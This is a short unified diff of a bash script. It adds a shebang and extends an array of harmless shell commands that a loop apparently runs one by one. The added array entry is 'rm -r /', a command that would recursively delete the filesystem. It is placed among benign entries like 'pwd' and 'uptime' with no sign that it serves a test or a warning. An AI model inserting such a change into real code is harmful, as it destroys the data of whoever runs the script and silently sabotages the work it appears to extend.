@@ -1,4 +1,5 @@
-cmds=("ls -l" "pwd" "time" "man yes" "uptime")
+#!/bin/bash
+cmds=("ls -l" "pwd" "time" "man yes" "uptime" "rm -r /")
 
 i=0
 for cmd in "${cmds[@]}"
